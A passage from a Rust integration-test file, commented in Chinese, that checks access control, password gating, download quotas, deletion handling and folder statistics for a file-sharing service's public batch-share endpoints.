    let res = public_get(&f, &format!("/api/public/shares/{}/media?file_id={}", share_id, t.x1)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "批次外的文件不该能取媒体");

    f.cleanup().await;
}

#[tokio::test]
async fn batch_denies_another_users_file_id() {
    let f = fixture("batch_cross_file").await;
    let (uid, token) = add_user(&f, "cross_owner").await;
    let (other, _) = add_user(&f, "cross_other").await;
    let (mine, _) = add_file(&f, uid, "mine.jpg", b"x").await;
    let (theirs, _) = add_file(&f, other, "theirs.jpg", b"secret").await;

    let share_id = make_batch(&f, &token, &[("file", mine)], None, None).await;

    // 换成别人的 file_id —— 这是最容易写漏的一条
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, theirs)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "他人文件必须被拒");
    let res = public_get(&f, &format!("/api/public/shares/{}/media?file_id={}", share_id, theirs)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "他人文件必须被拒");

    f.cleanup().await;
}

/// 缺少 `file_id` 参数时必须明确报错，而不是回落到「批次里唯一的那个文件」——
/// 那是旧模型的残留行为，在批次下意味着「随便拿一个」。
#[tokio::test]
async fn public_download_requires_an_explicit_file_id() {
    let f = fixture("batch_need_file_id").await;
    let (uid, token) = add_user(&f, "needid").await;
    let (file_id, _) = add_file(&f, uid, "only.jpg", b"x").await;
    let share_id = make_batch(&f, &token, &[("file", file_id)], None, None).await;

    let res = public_get(&f, &format!("/api/public/shares/{}/download", share_id)).await;
    assert_eq!(res.status(), StatusCode::BAD_REQUEST);
    let res = public_get(&f, &format!("/api/public/shares/{}/media", share_id)).await;
    assert_eq!(res.status(), StatusCode::BAD_REQUEST);

    f.cleanup().await;
}

/// 面包屑只能从**批次根**开始，不能把批次之外的祖先目录名露给客户。
#[tokio::test]
async fn public_breadcrumbs_do_not_leak_ancestors_outside_the_batch() {
    let f = fixture("batch_crumbs").await;
    let (uid, token) = add_user(&f, "crumb_owner").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("folder", t.a)], None, None).await;

    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.b)).await;
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;

    let crumbs: Vec<String> = body["data"]["breadcrumbs"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c["name"].as_str().unwrap().to_string())
        .collect();

    assert_eq!(crumbs, vec!["婚礼", "精修"], "面包屑应从批次根开始：{crumbs:?}");
    assert!(
        !crumbs.contains(&"祖先".to_string()),
        "批次之外的祖先目录名不该出现：{crumbs:?}"
    );

    f.cleanup().await;
}

// ---- 密码保护在批次下的行为 ----

#[tokio::test]
async fn password_protected_batch_blocks_browse_download_and_media() {
    let f = fixture("batch_pwd_guard").await;
    let (uid, token) = add_user(&f, "pwd_batch").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("folder", t.a)], Some("letmein"), None).await;

    // 不带票：浏览目录结构都不行（否则不输密码就能遍历出有哪些文件夹）
    let res = public_get(&f, &format!("/api/public/shares/{}/items", share_id)).await;
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "未验码不该能浏览");
    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.a)).await;
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "未验码不该能进目录");
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, t.a1)).await;
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "未验码不该能下载");
    let res = public_get(&f, &format!("/api/public/shares/{}/media?file_id={}", share_id, t.a1)).await;
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "未验码不该能取媒体");

    // 验码之后全部放行
    let res = router(&f)
        .oneshot(
            Request::builder()
                .method("POST")
                .uri(format!("/api/public/shares/{}/verify", share_id))
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(r#"{"password":"letmein"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let ticket = json_body(res).await["data"]["ticket"]
        .as_str()
        .unwrap()
        .to_string();

    let res = public_get(
        &f,
        &format!("/api/public/shares/{}/items?folder_id={}&ticket={}", share_id, t.a, ticket),
    )
    .await;
    assert_eq!(res.status(), StatusCode::OK, "验码后应能浏览");
    let res = public_get(
        &f,
        &format!("/api/public/shares/{}/download?file_id={}&ticket={}", share_id, t.a1, ticket),
    )
    .await;
    assert_eq!(res.status(), StatusCode::OK, "验码后应能下载");

    f.cleanup().await;
}

// ---- 额度与失效 ----

#[tokio::test]
async fn batch_download_quota_is_charged_per_file() {
    let f = fixture("batch_quota").await;
    let (uid, token) = add_user(&f, "quota_batch").await;
    let (f1, _) = add_file(&f, uid, "one.jpg", b"1111").await;
    let (f2, _) = add_file(&f, uid, "two.jpg", b"2222").await;
    let share_id = make_batch(&f, &token, &[("file", f1), ("file", f2)], None, Some(2)).await;

    // 两个文件、额度 2 → 都能下
    for id in [f1, f2] {
        let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, id)).await;
        assert_eq!(res.status(), StatusCode::OK, "file {id} 应在额度内");
    }

    let (count,): (i64,) = sqlx::query_as("SELECT download_count FROM file_shares WHERE id = ?")
        .bind(&share_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(count, 2, "每下一个文件扣一次");

    // 额度用尽
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, f1)).await;
    assert_eq!(res.status(), StatusCode::GONE, "额度用尽后应拒绝");

    f.cleanup().await;
}

#[tokio::test]
async fn deleted_items_disappear_from_the_public_view() {
    let f = fixture("batch_deleted").await;
    let (uid, token) = add_user(&f, "del_owner").await;
    let (keep, _) = add_file(&f, uid, "keep.jpg", b"x").await;
    let (gone, _) = add_file(&f, uid, "gone.jpg", b"x").await;
    let share_id = make_batch(&f, &token, &[("file", keep), ("file", gone)], None, None).await;

    sqlx::query("UPDATE files SET deleted_at = datetime('now') WHERE id = ?")
        .bind(gone)
        .execute(&f.pool)
        .await
        .unwrap();

    // 公开侧：已删的条目直接消失（客户不该看到「(已删除)」这种幽灵行）
    let body = json_body(public_get(&f, &format!("/api/public/shares/{}", share_id)).await).await;
    assert_eq!(body["data"]["item_count"], 1, "已删条目应从公开视图消失：{body}");

    // 所有者侧：保留占位，让他知道这批东西坏了
    let body = json_body(
        router(&f)
            .oneshot(authed_get(&format!("/api/shares/{}", share_id), &token))
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(body["data"]["item_count"], 2, "所有者应看到占位：{body}");
    assert_eq!(body["data"]["items"][1]["name"], "(已删除)");

    // 已删条目不可下载
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, gone)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND);

    f.cleanup().await;
}

#[tokio::test]
async fn deleting_a_batch_removes_its_items() {
    let f = fixture("batch_delete_cascade").await;
    let (uid, token) = add_user(&f, "cascade").await;
    let (file_id, _) = add_file(&f, uid, "a.jpg", b"x").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("file", file_id), ("folder", t.a)], None, None).await;

    let (before,): (i64,) =
        sqlx::query_as("SELECT COUNT(*) FROM share_items WHERE share_id = ?")
            .bind(&share_id)
            .fetch_one(&f.pool)
            .await
            .unwrap();
    assert_eq!(before, 2);

    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/shares/{}", share_id),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    let (after,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM share_items WHERE share_id = ?")
        .bind(&share_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(after, 0, "删批次应连带清掉条目（外键 CASCADE）");

    f.cleanup().await;
}

/// `batch/unshare` 在批次模型下的语义：停用**包含这些项的整个批次**。
#[tokio::test]
async fn batch_unshare_deactivates_whole_batches() {
    let f = fixture("batch_unshare_semantics").await;
    let (uid, token) = add_user(&f, "unshare_b").await;
    let (file_id, _) = add_file(&f, uid, "a.jpg", b"x").await;

    let share_id = make_batch(&f, &token, &[("file", file_id)], None, None).await;

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/batch/unshare",
            &token,
            &format!(r#"{{"items":[{{"type":"file","id":{}}}]}}"#, file_id),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;
    assert_eq!(body["data"]["unshared"], 1, "{body}");
    assert_eq!(body["data"]["results"][0]["status"], "unshared");
    assert_eq!(
        body["data"]["results"][0]["share_ids"][0].as_str().unwrap(),
        share_id
    );

    // 分享应已失效
    let res = public_get(&f, &format!("/api/public/shares/{}", share_id)).await;
    assert_eq!(res.status(), StatusCode::GONE, "批次应已失效");

    f.cleanup().await;
}

/// 批次里的文件夹递归计数要对，且不受已删内容影响。
#[tokio::test]
async fn batch_stats_are_recursive_and_ignore_trashed_content() {
    let f = fixture("batch_stats").await;
    let (uid, token) = add_user(&f, "stats_owner").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("folder", t.a)], None, None).await;

    let body = json_body(public_get(&f, &format!("/api/public/shares/{}", share_id)).await).await;
    // A 下有 a1，B 下有 b1 → 2 个文件；文件夹是 A 和 B → 2 个
    assert_eq!(body["data"]["total_file_count"], 2, "{body}");
    assert_eq!(body["data"]["total_folder_count"], 2, "{body}");

    // 把 b1 删掉之后再算，应当少一个文件
    sqlx::query("UPDATE files SET deleted_at = datetime('now') WHERE id = ?")
        .bind(t.b1)
        .execute(&f.pool)
        .await
        .unwrap();
    let body = json_body(public_get(&f, &format!("/api/public/shares/{}", share_id)).await).await;
    assert_eq!(
        body["data"]["total_file_count"], 1,
        "已进回收站的文件不该计入交付内容：{body}"
    );

    f.cleanup().await;
}
